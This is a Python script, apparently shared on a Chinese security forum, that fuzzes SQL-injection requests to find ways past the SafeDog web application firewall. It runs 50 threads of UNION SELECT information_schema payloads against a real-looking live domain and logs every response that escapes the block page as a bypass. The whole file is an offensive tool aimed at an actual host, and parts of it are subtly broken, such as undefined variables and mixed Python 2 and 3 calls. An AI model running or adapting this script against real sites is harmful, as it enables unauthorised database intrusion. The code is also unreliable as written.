#!/usr/bin/python
#coding:utf-8

'''
        学习了Va1n3R的注入绕过思路，自己也学习一下fuzz脚本的编写
        规则库还是使用Va1n3R的
        fuzz_zs = ['/*','*/','/*!','*','=','`','!','@','%','.','-','+','|','%00']
        fuzz_sz = ['',' ']
        fuzz_ch = ["%0a","%0b","%0c","%0d","%0e","%0f","%0g","%0h","%0i","%0j"]
        By T00ls.Net
'''

import sys,requests,time,threading,random
from multiprocessing import Process,Queue


fuzz_zs = ['/*','*/','/*!','*','=','`','!','@','%','.','-','+','|','%00']
fuzz_sz = ['',' ']
fuzz_ch = ["%0a","%0b","%0c","%0d","%0e","%0f","%0g","%0h","%0i","%0j"]
fuzz = fuzz_zs+fuzz_sz+fuzz_ch

headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0"}
i=0
glen = len(fuzz)**6

lock = threading.Lock()

def generator():
        
        for a in fuzz:
                for b in fuzz:
                        for c in fuzz:
                                for d in fuzz:
                                        for e in fuzz:
                                                for f in fuzz:
                                                        st = a+b+c+d+e+f
                                                        yield st

g = generator()

def geti():
        global i
        i+=1
        return i

def task(l):
        #print(l)
        for x in range(l):
                i=geti()
                lock.acquire()
                st=g.__next__()
                try:
                        url = "http://www.safedog.cn/service.html?serIdx=2/********ssssssss**********/union/********ssssssss**********/select/********ssssssss**********/1,2/********ssssssss**********/from/********ssssssss**********/"
                        url = url+"/*!"+a+b+c+d+"information_schema.tables*/"
                        sys.stdout.write(' '*30 + '\r')
                        #sys.stdout.flush()
                        print("[-] new URL: %s"%url)
                        sys.stdout.write("正在测试：%d/%d"%(i,glen))
                        sys.stdout.write(' '*30 + '\r')
                        sys.stdout.flush()
                finally:
                        lock.release()
                try:
                        res = requests.get(url,headers=headers)
                        if (("网站防火墙").decode('utf-8') in res.text) == False:
                                lock.acquire()
                                try:
                                        sys.stdout.write("[+] Find Bypass URL: %s\n"%url)
                                        with open('./apache.txt','a+') as f:
                                                f.write(url+'\n')
                                finally:
                                        lock.release()
                except:pass
                time.sleep(random.random())
def main():
        g = generator()
        thread_num=50
        global glen
        #将g分组
        # l 表示每个组的元素个数
        l = int(glen/thread_num)
        #创建线程并为线程分配list
        for j in range(thread_num):
                if j!=thread_num:
                        thread = threading.Thread(target=task,args=(l,))
                        #print(j)
                else:
                        #为了保证生成器的元素全部使用
                        l =l + glen%thread_num
                        thread = threading.Thread(target=task,args=(l,))
                thread.start()
        thread.join()

if __name__ == '__main__':
        main()
